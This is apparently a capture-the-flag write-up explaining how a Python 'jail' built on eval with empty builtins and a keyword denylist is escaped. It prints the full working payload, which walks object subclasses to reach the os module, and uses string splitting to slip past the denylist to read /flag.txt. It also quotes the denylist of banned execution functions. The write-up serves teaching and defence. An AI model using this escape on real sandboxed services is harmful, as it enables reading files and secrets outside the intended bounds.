# Explaining the PyJail Sandbox Escape (`playload.txt`)

This document explains why the payload in [`playload.txt`](file:///home/jenusdy/Downloads/misc-Out%20of%20the%20Box/sandboxed/playload.txt) successfully escapes the sandbox implemented in [`jail.py`](file:///home/jenusdy/Downloads/misc-Out%20of%20the%20Box/sandboxed/jail.py) and reads `/flag.txt`.

---

## 1. Sandbox Analysis ([`jail.py`](file:///home/jenusdy/Downloads/misc-Out%20of%20the%20Box/sandboxed/jail.py))

The evaluator in [`jailed()`](file:///home/jenusdy/Downloads/misc-Out%20of%20the%20Box/sandboxed/jail.py#L14-L27) applies three primary layers of defense:

1. **Length Limit**:
   - The payload length must not exceed `MAXLEN = 400` characters (`len(src) <= 400`).
2. **Denylist Filtering**:
   - The lowercased input (`src.lower()`) is scanned for substrings in `BANNED`:
     ```python
     BANNED = [
         "import", "eval", "exec", "compile", "system", "popen", "subprocess",
         "open", "input", "breakpoint", "help", "pickle", "marshal", "os", "sys",
         "flag", "print", "write", "\\", "chr", "getattr", "setattr", "vars", "dir",
     ]
     ```
3. **Empty Builtins**:
   - The expression is evaluated using:
     ```python
     eval(src, {"__builtins__": {}}, {})
     ```
   - Standard built-in functions such as `open`, `__import__`, `getattr`, etc. are unavailable directly in the evaluation namespace.

---

## 2. The Payload ([`playload.txt`](file:///home/jenusdy/Downloads/misc-Out%20of%20the%20Box/sandboxed/playload.txt))

```python
[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__=='_Prin'+'ter'][0].__init__.__globals__['s'+'ys'].modules['o'+'s'].__dict__['re'+'ad']([x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__=='_Prin'+'ter'][0].__init__.__globals__['s'+'ys'].modules['o'+'s'].__dict__['o'+'pen']('/f'+'lag.txt',0),100)
```

---

## 3. Step-by-Step Breakdown of Why It Works

### Step A: Bypassing the Denylist via String Concatenation
The blacklist check in [`jailed()`](file:///home/jenusdy/Downloads/misc-Out%20of%20the%20Box/sandboxed/jail.py#L14-L27) checks for static substrings (`b in low`). Because string evaluation happens at runtime inside `eval()`, string concatenation can construct forbidden keywords dynamically:

| Banned Keyword | Payload Construction | Why it works |
| :--- | :--- | :--- |
| `"print"` | `'_Prin' + 'ter'` | Bypasses `"print"` check while finding the `_Printer` class |
| `"sys"` | `'s' + 'ys'` | Accesses the `sys` module without containing `"sys"` |
| `"os"` | `'o' + 's'` | Accesses the `os` module without containing `"os"` |
| `"open"` | `'o' + 'pen'` | Accesses `os.open` without containing `"open"` |
| `"flag"` | `'/f' + 'lag.txt'` | Points to `/flag.txt` without containing `"flag"` |

Total payload length is **333 characters**, safely under the 400-character limit.

---

### Step B: Reaching the Root `object` Hierarchy
Even with empty `__builtins__`, any Python literal retains access to its type class and inheritance tree:
- `()` is an empty tuple instance.
- `().__class__` evaluates to `<class 'tuple'>`.
- `().__class__.__bases__[0]` navigates to the base class of `tuple`, which is `<class 'object'>`.

---

### Step C: Subclass Introspection & Targeting `_Printer`
Calling `object.__subclasses__()` returns a list of all active classes in the Python runtime:
```python
().__class__.__bases__[0].__subclasses__()
```
Instead of relying on a hardcoded index (which can differ between Python environments), the payload uses a list comprehension:
```python
[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == '_Prin' + 'ter'][0]
```
`_Printer` is a helper class defined in Python's standard `site.py` module (responsible for interactive printing helpers like `copyright` and `license`).

---

### Step D: Module Breakout via `__init__.__globals__`
In Python, function and method objects carry a reference to their defining module's global namespace via `__globals__`:
```python
[...][0].__init__.__globals__
```
Because `site.py` imports `sys` at startup, its `__globals__` contains a direct reference to the `sys` module:
```python
__globals__['s' + 'ys']
```

---

### Step E: Accessing `os` from `sys.modules`
The `sys` module maintains a registry of all imported modules in `sys.modules`.
Since the runtime environment has already imported `os`, the payload retrieves the `os` module object:
```python
sys.modules['o' + 's']
```

---

### Step F: Accessing Low-Level I/O Functions via `__dict__`
The blacklist forbids `getattr`, but Python modules expose their attributes through their dictionary `__dict__`:
- `os.__dict__['o' + 'pen']` -> [`os.open`](https://docs.python.org/3/library/os.html#os.open) (low-level file descriptor open)
- `os.__dict__['re' + 'ad']` -> [`os.read`](https://docs.python.org/3/library/os.html#os.read) (low-level file descriptor read)

---

### Step G: File Reading and Evaluation Output
The inner expression opens `/flag.txt` in read-only mode (`flags = 0` which corresponds to `os.O_RDONLY`):
```python
fd = os.open('/flag.txt', 0)
```
The outer expression reads up to 100 bytes from that file descriptor:
```python
os.read(fd, 100)
```
Because [`jailed()`](file:///home/jenusdy/Downloads/misc-Out%20of%20the%20Box/sandboxed/jail.py#L14-L27) wraps the `eval()` call inside `repr(...)`:
```python
return repr(eval(src, {"__builtins__": {}}, {}))
```
the evaluated `bytes` object is directly printed:
```
b'H7CTF{...}'
```
